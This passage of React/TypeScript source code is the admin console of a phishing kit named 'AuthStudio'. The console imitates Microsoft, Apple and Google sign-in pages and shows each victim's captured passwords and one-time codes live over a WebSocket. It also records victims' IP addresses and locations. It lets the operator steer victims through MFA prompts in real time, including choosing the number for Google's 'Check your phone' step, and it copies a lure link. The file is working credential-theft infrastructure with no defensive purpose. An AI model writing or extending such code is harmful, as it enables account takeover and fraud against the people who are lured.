              <div className="flex items-center gap-2 mb-4">
                <Database className="w-3.5 h-3.5 text-[#555d6b]" />
                <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b]">Captured Data</p>
                {formHistory.length > 0 && (
                  <>
                    <span className="ml-auto text-[10px] font-semibold text-green-400">{formHistory.length} entr{formHistory.length !== 1 ? 'ies' : 'y'}</span>
                    <button onClick={() => { if (confirm('Clear all captured data for this visitor?')) onDeleteAll(visitor.id); }}
                      className="w-5 h-5 flex items-center justify-center rounded hover:bg-red-900/40 text-[#555d6b] hover:text-red-400 transition-colors" title="Clear all data">
                      <Trash2 className="w-3 h-3" />
                    </button>
                  </>
                )}
              </div>

              {formHistory.length === 0 ? (
                <div className="rounded-xl border border-dashed border-[#2d3139] px-3 py-7 text-center">
                  <div className="w-8 h-8 rounded-full bg-[#1e2128] flex items-center justify-center mx-auto mb-2">
                    <Database className="w-4 h-4 text-[#3e4450]" />
                  </div>
                  <div className="text-[12px] text-[#555d6b]">No data yet</div>
                  <div className="text-[10px] text-[#3e4450] mt-1">Fields appear as the visitor submits each step</div>
                </div>
              ) : (
                <div className="space-y-2">
                  {formHistory.map((entry, idx) => {
                    const { field, value, ts } = entry;
                    const sensitive = isSensitive(field);
                    const revealKey = `${field}-${idx}`;
                    const revealed = revealField === revealKey;
                    return (
                      <div key={idx} className="bg-[#1a1d24] rounded-xl border border-[#2d3139] overflow-hidden group">
                        <div className="flex items-center justify-between px-3 pt-2.5 pb-1">
                          <div className="flex items-center gap-2 min-w-0">
                            <span className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest flex-shrink-0">{FIELD_LABELS[field] ?? field}</span>
                            <span className="text-[9px] text-[#3e4450] flex-shrink-0">{new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}</span>
                          </div>
                          <div className="flex items-center gap-1.5 flex-shrink-0">
                            {sensitive && (
                              <button onClick={() => setRevealField(revealed ? null : revealKey)} className="text-[9px] font-semibold text-amber-500 hover:text-amber-300 transition-colors uppercase tracking-wide">
                                {revealed ? 'hide' : 'show'}
                              </button>
                            )}
                            <button onClick={() => onDeleteField(visitor.id, field)}
                              className="w-4 h-4 flex items-center justify-center rounded hover:bg-red-900/40 text-[#3e4450] hover:text-red-400 transition-colors opacity-0 group-hover:opacity-100" title={`Delete all ${field} entries`}>
                              <X className="w-2.5 h-2.5" />
                            </button>
                          </div>
                        </div>
                        <div className="px-3 pb-3 pt-0.5">
                          <span className="text-[13px] font-mono break-all" style={{ color: sensitive && !revealed ? '#6b7280' : sensitive ? '#f87171' : '#e2e8f0' }}>
                            {sensitive && !revealed ? '•'.repeat(Math.min(value.length, 12)) : value}
                          </span>
                        </div>
                      </div>
                    );
                  })}

                  {/* Session info */}
                  <div className="mt-4 pt-4 border-t border-[#2d3139] space-y-2">
                    <p className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest mb-2">Session Info</p>
                    {([
                      ['Connected', new Date(visitor.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })],
                      ['Provider', visitor.provider],
                      ['Browser', `${ua.browser} on ${ua.os}`],
                      ['IP', visitor.ip],
                      ['Status', visitor.online ? 'Online' : 'Offline — persisted'],
                    ] as [string, string][]).map(([lbl, val]) => (
                      <div key={lbl} className="flex justify-between items-start text-[11px] gap-2">
                        <span className="text-[#555d6b] flex-shrink-0">{lbl}</span>
                        <span className={`font-mono text-right break-all ${lbl === 'Status' && !visitor.online ? 'text-amber-500' : 'text-[#8a919e]'}`}>{val}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// ── Main AdminPage ─────────────────────────────────────────────────────────────

export default function AdminPage() {
  const [provider, setProvider] = useState<Provider>('microsoft');
  const [pendingProvider, setPendingProvider] = useState<Provider | null>(null);
  const [device, setDevice] = useState<Device>('desktop');
  const [theme, setTheme] = useState<Theme>('light');
  const [prompt, setPrompt] = useState<Prompt>('password');
  const [phoneEnabled, setPhoneEnabled] = useState(false);
  const [googlePhone, setGooglePhone] = useState('09');
  const [gVerifyMethod, setGVerifyMethod] = useState<'sms' | 'auth'>('sms');
  const [gCorrectNumber, setGCorrectNumber] = useState(45);
  const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
  const [modalVisitorIp, setModalVisitorIp] = useState<string | null>(null);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [windowWidth, setWindowWidth] = useState(typeof window !== 'undefined' ? window.innerWidth : 1200);
  const wsRef = useRef<WebSocket | null>(null);

  useEffect(() => {
    const onResize = () => { setWindowWidth(window.innerWidth); };
    window.addEventListener('resize', onResize);
    return () => window.removeEventListener('resize', onResize);
  }, []);

  const isMobileAdmin = windowWidth < 768;

  useEffect(() => {
    let ws: WebSocket | undefined;
    try {
      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
      wsRef.current = ws;

      ws.onopen = () => {
        ws!.send(JSON.stringify({ type: 'register-admin' }));
      };

      ws.onmessage = (e: MessageEvent<string>) => {
        try {
          type FormHistoryEntry = { field: string; value: string; ts: number };
          const msg = JSON.parse(e.data) as {
            type: string;
            visitors?: Array<VisitorInfo & { formData?: Record<string,string>; formHistory?: FormHistoryEntry[] }>;
            visitor?: VisitorInfo & { formData?: Record<string,string>; formHistory?: FormHistoryEntry[] };
            globalProvider?: string;
            id?: string;
            step?: string;
            provider?: string;
            field?: string;
            value?: string;
            ts?: number;
          };

          if (msg.type === 'visitors' && msg.visitors) {
            setVisitors(msg.visitors.map(v => ({ ...v, formData: v.formData ?? {}, formHistory: v.formHistory ?? [], online: true })));
            if (msg.globalProvider) setProvider(msg.globalProvider as Provider);
          } else if (msg.type === 'global-provider' && msg.provider) {
            setProvider(msg.provider as Provider);
          } else if (msg.type === 'visitor-joined' && msg.visitor) {
            const v = { ...msg.visitor, formData: msg.visitor.formData ?? {}, formHistory: msg.visitor.formHistory ?? [], online: true };
            setVisitors(prev => {
              const existing = prev.find(x => x.ip === v.ip);
              const merged: VisitorInfo = existing
                ? { ...v, formData: { ...existing.formData, ...v.formData }, formHistory: [...(existing.formHistory ?? []), ...v.formHistory] }
                : v;
              return [...prev.filter(x => x.ip !== v.ip), merged];
            });
          } else if (msg.type === 'visitor-left' && msg.id) {
            setVisitors(prev => prev.map(v => v.id === msg.id ? { ...v, online: false } : v));
          } else if (msg.type === 'visitor-updated' && msg.id) {
            setVisitors(prev => prev.map(v =>
              v.id === msg.id ? { ...v, step: msg.step ?? v.step, provider: msg.provider ?? v.provider } : v
            ));
          } else if (msg.type === 'visitor-form-data' && msg.id && msg.field) {
            const entry: FormHistoryEntry = { field: msg.field!, value: msg.value ?? '', ts: msg.ts ?? Date.now() };
            setVisitors(prev => prev.map(v =>
              v.id === msg.id ? {
                ...v,
                formData: { ...v.formData, [msg.field!]: msg.value ?? '' },
                formHistory: [...(v.formHistory ?? []), entry],
              } : v
            ));
          } else if (msg.type === 'visitor-form-data-deleted' && msg.id) {
            setVisitors(prev => prev.map(v => {
              if (v.id !== msg.id) return v;
              if (msg.field === '*') return { ...v, formData: {}, formHistory: [] };
              const next = { ...v.formData };
              delete next[msg.field!];
              return { ...v, formData: next, formHistory: (v.formHistory ?? []).filter(e => e.field !== msg.field) };
            }));
          } else if (msg.type === 'visitor-deleted' && msg.id) {
            setVisitors(prev => prev.filter(v => v.id !== msg.id));
            setModalVisitorIp(prev => { const v = visitors.find(x => x.id === msg.id); return prev === (v?.ip ?? msg.id) ? null : prev; });
          }
        } catch { /* ignore */ }
      };
    } catch { /* ignore */ }

    return () => { try { ws?.close(); } catch { /* ignore */ } };
  }, []);

  const pushAction = (visitorId: string, navigate: string, extra?: { promptNumber?: number; phoneDigits?: string }) => {
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'push-action', visitorId, action: { navigate, ...extra } }));
    }
  };

  const confirmProviderSwitch = (p: Provider) => {
    setProvider(p);
    if (p !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); }
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'switch-provider', provider: p }));
    }
    setPendingProvider(null);
  };

  const deleteField = (visitorId: string, field: string) => {
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'delete-form-data', visitorId, field }));
    }
  };

  const deleteAll = (visitorId: string) => {
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'delete-form-data', visitorId, field: '*' }));
    }
  };

  const deleteVisitor = (visitorId: string) => {
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'delete-visitor', visitorId }));
    } else {
      setVisitors(prev => prev.filter(v => v.id !== visitorId));
    }
  };

  const modalVisitor = visitors.find(v => v.ip === modalVisitorIp) ?? null;

  const providers: { id: Provider; name: string; icon: React.ReactNode }[] = [
    { id: 'microsoft', name: 'Microsoft', icon: <MicrosoftLogoLg /> },
    { id: 'apple',     name: 'Apple',     icon: <AppleLogo className="w-[18px] h-[18px]" /> },
    { id: 'google',    name: 'Google',    icon: <GoogleLogo /> },
  ];

  const devices: { id: Device; name: string; icon: React.ReactNode }[] = [
    { id: 'desktop', name: 'Desktop', icon: <Monitor className="w-4 h-4" /> },
    { id: 'tablet',  name: 'Tablet',  icon: <Tablet className="w-4 h-4" /> },
    { id: 'mobile',  name: 'Mobile',  icon: <Smartphone className="w-4 h-4" /> },
  ];

  const prompts: { id: Prompt; name: string; icon: React.ReactNode; desc: string }[] = [
    { id: 'password',   name: 'Password',   icon: <Lock className="w-3.5 h-3.5 text-white" />,       desc: 'Standard password entry' },
    { id: 'email-code', name: 'Email code', icon: <Mail className="w-3.5 h-3.5 text-white" />,       desc: 'Send code to email' },
    { id: 'other-ways', name: 'Other ways', icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
  ];

  const src = loginSrc(provider, device, theme, prompt, phoneEnabled, googlePhone, gVerifyMethod, gCorrectNumber);
  const accentColor = PROVIDER_COLORS[provider];

  const onlineCount = visitors.filter(v => v.online).length;
  const visitorsByProvider: Record<string, VisitorInfo[]> = {};
  for (const v of visitors) {
    (visitorsByProvider[v.provider] ??= []).push(v);
  }

  return (
    <div className="flex h-screen w-full overflow-hidden bg-[#0b0c10] text-[#ececf1] font-sans">

      {/* Provider switch confirmation */}
      {pendingProvider && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4" style={{ backgroundColor: 'rgba(0,0,0,0.75)', backdropFilter: 'blur(4px)' }}>
          <div className="bg-[#16181d] border border-[#2d3139] rounded-2xl shadow-2xl w-full max-w-sm p-6 flex flex-col gap-5">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-white flex items-center justify-center flex-shrink-0 shadow">
                {providers.find(p => p.id === pendingProvider)?.icon}
              </div>
              <div>
                <p className="text-white font-semibold text-[15px] leading-snug">Switch to {providers.find(p => p.id === pendingProvider)?.name}?</p>
                <p className="text-[12px] text-[#8a919e] mt-0.5">All active visitors will be switched in real time</p>
              </div>
            </div>
            <div className="flex gap-3">
              <button
                onClick={() => setPendingProvider(null)}
                className="flex-1 py-2.5 rounded-xl border border-[#2d3139] text-[13px] font-semibold text-[#aeb5c0] hover:bg-[#1e2128] transition-colors"
              >
                Cancel
              </button>
              <button
                onClick={() => confirmProviderSwitch(pendingProvider)}
                className="flex-1 py-2.5 rounded-xl text-[13px] font-semibold text-white transition-colors"
                style={{ backgroundColor: PROVIDER_COLORS[pendingProvider] }}
              >
                Yes, switch
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal */}
      {modalVisitor && (
        <VisitorModal
          visitor={modalVisitor}
          onClose={() => setModalVisitorIp(null)}
          onPushAction={pushAction}
          onDeleteField={deleteField}
          onDeleteAll={deleteAll}
        />
      )}

      {/* Mobile overlay */}
      {isMobileAdmin && sidebarOpen && (
        <div className="fixed inset-0 z-40 bg-black/60 backdrop-blur-sm" onClick={() => setSidebarOpen(false)} />
      )}

      {/* Sidebar */}
      <aside className={`flex-shrink-0 flex flex-col bg-[#16181d] border-r border-[#2d3139] shadow-xl
        ${isMobileAdmin
          ? `fixed inset-y-0 left-0 z-50 w-[260px] transition-transform duration-300 ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'}`
          : 'w-[240px] relative'
        }`}>
        <div className="h-14 flex items-center gap-3 px-5 border-b border-[#2d3139]/60 flex-shrink-0">
          <div className="w-6 h-6 rounded-md bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center shadow">
            <Key className="w-3.5 h-3.5 text-white" />
          </div>
          <span className="text-[15px] font-semibold tracking-tight text-white">AuthStudio</span>
          {isMobileAdmin && (
            <button onClick={() => setSidebarOpen(false)} className="ml-auto p-1.5 rounded-lg text-[#8a919e] hover:text-white hover:bg-[#2d3139] transition-colors">
              <X className="w-4 h-4" />
            </button>
          )}
        </div>

        <div className="flex-1 overflow-y-auto p-4 space-y-6">

          {/* Provider */}
          <section className="space-y-2">
            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Provider</p>
            <div className="space-y-1">
              {providers.map(p => {
                const count = (visitorsByProvider[p.id] ?? []).filter(v => v.online).length;
                return (
                  <button
                    key={p.id}
                    onClick={() => { if (p.id !== provider) setPendingProvider(p.id); }}
                    data-testid={`provider-btn-${p.id}`}
                    className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left ${provider === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
                  >
                    <div className="w-7 h-7 rounded-md bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
                      {p.icon}
                    </div>
                    <span className={`text-[14px] font-medium flex-1 ${provider === p.id ? 'text-white' : 'text-[#aeb5c0]'}`}>{p.name}</span>
                    {count > 0 && (
                      <span className="w-4 h-4 rounded-full bg-green-500 text-white text-[9px] font-bold flex items-center justify-center flex-shrink-0">{count}</span>
                    )}
                    {count === 0 && provider === p.id && (
                      <span className="w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ backgroundColor: accentColor }} />
                    )}
                  </button>
                );
              })}
            </div>
          </section>

          {/* Device */}
          <section className="space-y-2">
            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Device</p>
            <div className="flex bg-[#0f1115] p-1 rounded-lg border border-[#2d3139]">
              {devices.map(d => (
                <button
                  key={d.id}
                  onClick={() => setDevice(d.id)}
                  data-testid={`device-btn-${d.id}`}
                  className={`flex-1 flex flex-col items-center py-2 rounded-md transition-all gap-1 ${device === d.id ? 'bg-[#2d3139] text-white' : 'text-[#8a919e] hover:text-white hover:bg-[#1e2128]'}`}
                >
                  {d.icon}
                  <span className="text-[10px] font-medium">{d.name}</span>
                </button>
              ))}
            </div>
          </section>

          {/* Theme */}
          <section className="space-y-2">
            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Theme</p>
            <div className="flex bg-[#0f1115] p-1 rounded-lg border border-[#2d3139]">
              <button onClick={() => setTheme('light')} data-testid="theme-btn-light"
                className={`flex-1 flex items-center justify-center gap-1.5 py-2 rounded-md transition-all text-[12px] font-semibold ${theme === 'light' ? 'bg-white text-black' : 'text-[#8a919e] hover:text-white'}`}>
                <Sun className="w-3.5 h-3.5" /> Light
              </button>
              <button onClick={() => setTheme('dark')} data-testid="theme-btn-dark"
                className={`flex-1 flex items-center justify-center gap-1.5 py-2 rounded-md transition-all text-[12px] font-semibold ${theme === 'dark' ? 'bg-[#2d3139] text-white' : 'text-[#8a919e] hover:text-white'}`}>
                <Moon className="w-3.5 h-3.5" /> Dark
              </button>
            </div>
          </section>

          {/* Prompt — Microsoft only */}
          {provider === 'microsoft' && (
            <section className="space-y-2">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Prompt</p>
              <div className="space-y-1">
                {prompts.map(p => (
                  <button key={p.id} onClick={() => setPrompt(p.id)}
                    className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left ${prompt === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}>
                    <div className={`w-7 h-7 rounded-md flex items-center justify-center flex-shrink-0 shadow-sm transition-colors ${prompt === p.id ? 'bg-[#0078D4]' : 'bg-[#2a2d35]'}`}>
                      {p.icon}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className={`text-[13px] font-medium leading-none mb-0.5 ${prompt === p.id ? 'text-white' : 'text-[#aeb5c0]'}`}>{p.name}</div>
                      <div className="text-[11px] text-[#606672] truncate">{p.desc}</div>
                    </div>
                    {prompt === p.id && <span className="w-1.5 h-1.5 rounded-full flex-shrink-0 bg-[#0078D4]" />}
                  </button>
                ))}
              </div>
            </section>
          )}

          {/* Prompt — Google only */}
          {provider === 'google' && (
            <section className="space-y-2">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Prompt</p>
              <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24] divide-y divide-[#2d3139]">

                {/* Phone last digits */}
                <div className="flex items-center justify-between px-3 py-2.5">
                  <div className="flex items-center gap-2.5">
                    <Smartphone className="w-4 h-4 text-[#6b7280]" />
                    <div>
                      <div className="text-[12px] text-[#aeb5c0] font-medium leading-none mb-0.5">Phone last digits</div>
                      <div className="text-[10px] text-[#606672] font-mono tracking-widest">●●●●●●●●{googlePhone}</div>
                    </div>
                  </div>
                  <div className="flex items-center gap-1">
                    <button onClick={() => setGooglePhone(p => String(Math.max(0, parseInt(p) - 1)).padStart(2, '0'))}
                      className="w-5 h-5 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-sm font-bold leading-none transition-colors">−</button>
                    <span className="text-[13px] font-mono font-semibold text-white w-6 text-center">{googlePhone}</span>
                    <button onClick={() => setGooglePhone(p => String(Math.min(99, parseInt(p) + 1)).padStart(2, '0'))}
                      className="w-5 h-5 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-sm font-bold leading-none transition-colors">+</button>
                  </div>
                </div>

                {/* Verify method toggle */}
                <div className="px-3 py-2.5">
                  <div className="text-[12px] text-[#aeb5c0] font-medium mb-1.5">Verification method</div>
                  <div className="flex gap-1.5">
                    {(['sms', 'auth'] as const).map(m => (
                      <button key={m}
                        onClick={() => setGVerifyMethod(m)}
                        className={`flex-1 py-1 rounded text-[11px] font-medium transition-colors ${gVerifyMethod === m ? 'bg-[#4285F4] text-white' : 'bg-[#2a2d35] text-[#8a919e] hover:bg-[#3a3f4a]'}`}>
                        {m === 'sms' ? 'SMS Code' : 'Authenticator'}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Correct number for prompt-number step */}
                <div className="flex items-center justify-between px-3 py-2.5">
                  <div>
                    <div className="text-[12px] text-[#aeb5c0] font-medium leading-none mb-0.5">Prompt number</div>
                    <div className="text-[10px] text-[#606672]">Correct # for "Check your phone"</div>
                  </div>
                  <div className="flex items-center gap-1">
                    <button onClick={() => setGCorrectNumber(n => Math.max(1, n - 1))}
                      className="w-5 h-5 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-sm font-bold leading-none transition-colors">−</button>
                    <span className="text-[13px] font-mono font-semibold text-white w-7 text-center">{gCorrectNumber}</span>
                    <button onClick={() => setGCorrectNumber(n => Math.min(99, n + 1))}
                      className="w-5 h-5 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-sm font-bold leading-none transition-colors">+</button>
                  </div>
                </div>

              </div>
            </section>
          )}

          {/* Options — Microsoft only */}
          {provider === 'microsoft' && (
            <section className="space-y-2">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Options</p>
              <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24]">
                <div className="flex items-center justify-between px-3 py-3">
                  <div className="flex items-center gap-2.5">
                    <Smartphone className="w-4 h-4 text-[#6b7280]" />
                    <div>
                      <div className="text-[13px] text-[#aeb5c0] font-medium leading-none mb-0.5">Phone SMS</div>
                      <div className="text-[10px] text-[#606672]">Show phone code option</div>
                    </div>
                  </div>
                  <Toggle enabled={phoneEnabled} onToggle={() => setPhoneEnabled(v => !v)} />
                </div>
              </div>
            </section>
          )}

        </div>

        <div className="h-10 flex items-center justify-center border-t border-[#2d3139]/50 text-[11px] text-[#555d6b] flex-shrink-0">
          AuthStudio v1.0
        </div>
      </aside>

      {/* Visitor dashboard */}
      <main className="flex-1 flex flex-col overflow-hidden" style={{ backgroundColor: '#0b0c10' }}>

        {/* Top bar */}
        <div className="h-14 flex items-center gap-3 px-5 border-b border-[#2d3139] bg-[#0f1115] flex-shrink-0">
          {isMobileAdmin && (
            <button
              onClick={() => setSidebarOpen(true)}
              className="p-2 rounded-lg bg-[#16181d] border border-[#2d3139] text-[#aeb5c0] hover:text-white transition-colors flex-shrink-0"
            >
              <Menu className="w-4 h-4" />
            </button>
          )}
          <div className="flex items-center gap-3 flex-1 min-w-0">
            <span className="text-white text-[14px] font-semibold">Visitors</span>
            {onlineCount > 0 && (
              <span className="flex items-center gap-1.5 bg-green-500/15 text-green-400 text-[11px] font-semibold px-2.5 py-1 rounded-full border border-green-500/25">
                <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
                {onlineCount} live
              </span>
            )}
            {visitors.length > 0 && (
              <span className="text-[#555d6b] text-[12px]">{visitors.length} total</span>
            )}
          </div>
          <button
            onClick={() => { navigator.clipboard.writeText(src).catch(() => {}); }}
            title="Copy login link to clipboard"
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1e2128] border border-[#2d3139] text-[#8a919e] hover:text-white hover:border-[#3a3f4a] transition-colors text-[11px] font-medium flex-shrink-0"
          >
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
              <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
            </svg>
            Copy link
          </button>
        </div>

        {/* Content area */}
        <div className="flex-1 overflow-y-auto p-5">
          {visitors.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-full min-h-[400px] gap-4 text-center">
              <div className="w-16 h-16 rounded-2xl bg-[#16181d] border border-[#2d3139] flex items-center justify-center mb-2">
                <Eye className="w-7 h-7 text-[#3e4450]" />
              </div>
              <div>
                <p className="text-[#aeb5c0] text-[15px] font-semibold mb-1">No visitors yet</p>
                <p className="text-[#555d6b] text-[13px]">Share the login link above — visitors will appear here live.</p>
              </div>
            </div>
          ) : (
            <div className="grid gap-4 grid-cols-1 sm:grid-cols-2 xl:grid-cols-3">
              {visitors.map(v => {
                const vStepColor = STEP_COLORS[v.step] ?? '#4b5563';
                const vStepLabel = STEP_LABELS[v.step] ?? v.step;
                const vUA = parseUA(v.userAgent);
                const dataEntries = Object.entries(v.formData ?? {});
                const hasData = dataEntries.length > 0;
                const isSens = (f: string) => f === 'password' || f === 'email_code' || f === 'phone_code' || f === 'verification_code';
                return (
                  <div
                    key={v.id}
                    className={`rounded-xl border overflow-hidden flex flex-col transition-all cursor-pointer group
                      ${v.online
                        ? 'border-[#2d3139] bg-[#16181d] hover:border-[#3a3f4a] hover:bg-[#1a1d24]'
                        : 'border-[#1e2128] bg-[#13151a] opacity-60'
                      }`}
                    onClick={() => setModalVisitorIp(v.ip)}
                  >
                    {/* Card header */}
                    <div className="flex items-start gap-3 px-4 pt-4 pb-3">
                      <div className="relative flex-shrink-0">
                        <div className="w-9 h-9 rounded-lg bg-white flex items-center justify-center shadow-sm">
                          <ProviderBadge provider={v.provider} size={18} />
                        </div>
                        <div className={`absolute -bottom-0.5 -right-0.5 w-2.5 h-2.5 rounded-full border-2 border-[#16181d] ${v.online ? 'bg-green-400' : 'bg-[#555d6b]'}`} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="text-white text-[13px] font-semibold capitalize">{v.provider}</span>
                          <span className="text-[10px] font-semibold px-1.5 py-0.5 rounded text-white leading-none flex-shrink-0" style={{ backgroundColor: vStepColor }}>
                            {vStepLabel}
                          </span>
                        </div>
                        <div className="text-[11px] text-[#8a919e] mt-1">{v.location.flag} {v.location.city}, {v.location.country}</div>
                        <div className="text-[10px] text-[#555d6b] mt-0.5">{vUA.browser} · {vUA.os}</div>
                      </div>
                      <div className="flex-shrink-0 text-right">
                        <div className="text-[10px] font-mono text-[#555d6b]">
                          {new Date(v.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </div>
                        {hasData && (
                          <div className="mt-1 flex items-center justify-end gap-1">
                            <span className="w-1.5 h-1.5 rounded-full bg-amber-400" />
                            <span className="text-[10px] text-amber-400 font-semibold">{dataEntries.length}</span>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Captured data preview */}
                    {hasData && (
                      <div className="px-4 pb-3">
                        <div className="bg-[#0d0f14] rounded-lg px-3 py-2.5 space-y-1.5 border border-[#232630]">
                          {dataEntries.slice(0, 4).map(([field, value]) => (
                            <div key={field} className="flex items-center gap-2 min-w-0">
                              <span className="text-[9px] font-bold uppercase tracking-widest text-[#555d6b] w-[72px] flex-shrink-0 truncate">
                                {FIELD_LABELS[field] ?? field}
                              </span>
                              <span className="text-[11px] font-mono truncate" style={{ color: isSens(field) ? '#6b7280' : '#c9d1d9' }}>
                                {isSens(field) ? '•'.repeat(Math.min(value.length, 14)) : value || '—'}
                              </span>
                            </div>
                          ))}
                          {dataEntries.length > 4 && (
                            <p className="text-[10px] text-[#3e4450] pt-0.5">+{dataEntries.length - 4} more fields</p>
                          )}
                        </div>
                      </div>
                    )}

                    {/* Footer actions */}
                    <div className="px-4 pb-4 mt-auto flex gap-2" onClick={e => e.stopPropagation()}>
                      <button
                        onClick={() => setModalVisitorIp(v.ip)}
                        className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg bg-[#2d3139] hover:bg-[#3a3f4a] text-[#aeb5c0] hover:text-white transition-colors text-[12px] font-medium"
                      >
                        <Eye className="w-3.5 h-3.5" />
                        Live View
                      </button>
                      <button
                        onClick={() => { if (confirm('Remove this visitor from the dashboard?')) deleteVisitor(v.id); }}
                        className="w-9 h-9 flex items-center justify-center rounded-lg bg-[#2d3139] hover:bg-red-900/50 text-[#555d6b] hover:text-red-400 transition-colors flex-shrink-0"
                        title="Delete visitor"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
